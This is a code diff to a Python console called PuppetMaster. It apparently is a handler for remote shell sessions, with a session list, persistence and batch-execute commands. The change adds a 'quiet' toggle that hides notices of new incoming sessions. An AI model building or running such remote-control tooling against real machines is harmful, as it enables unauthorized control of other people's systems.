@@ -36,6 +36,7 @@ class PuppetMaster:
     def __init__(self):
         self.sessions = list()
         self.handlers = list()
+        self.quiet              = False
         self.Persistence        = True
         self.current_session    = None
         self.DuplicateSession   = False
@@ -51,7 +52,7 @@ class PuppetMaster:
 Puppet_Master = PuppetMaster()
 
 def completer(text, state):
-    func = ['cls', 'clear', 'listeners', 'handlers', 'sessions', 'execute ', 'close', 'exit', 'BATCH-EXECUTE ', 'use '] + [ _['hash'] for _ in Puppet_Master.sessions ]
+    func = ['cls', 'clear', 'listeners', 'handlers', 'sessions', 'execute ', 'quiet', 'close', 'exit', 'BATCH-EXECUTE ', 'use '] + [ _['hash'] for _ in Puppet_Master.sessions ]
     matches = [ _ for _ in func if _.startswith(text) ]
     if state < len(matches):
         return matches[state]
@@ -162,7 +163,8 @@ async def handle_shell_init(reader, writer):
                     break
 
                 else:
-                    print(f'\033[33m[*] Session {session_hash} {hostname} {username}  {sockname} -> {peername} in sessions list {datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")}\033[0m')
+                    if Puppet_Master.quiet == False:
+                        print(f'\033[33m[*] Session {session_hash} {hostname} {username}  {sockname} -> {peername} in sessions list {datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")}\033[0m')
                     writer.close()
                     return None
 
@@ -282,6 +284,12 @@ async def MasterConsole():
         elif Puppet_Master.current_session and console_cmd == "bg":
             Puppet_Master.current_session = None
 
+        elif console_cmd == "quiet":
+            if Puppet_Master.quiet == True:
+                Puppet_Master.quiet = False
+            else:
+                Puppet_Master.quiet = True
+            
         else:
             continue
     return
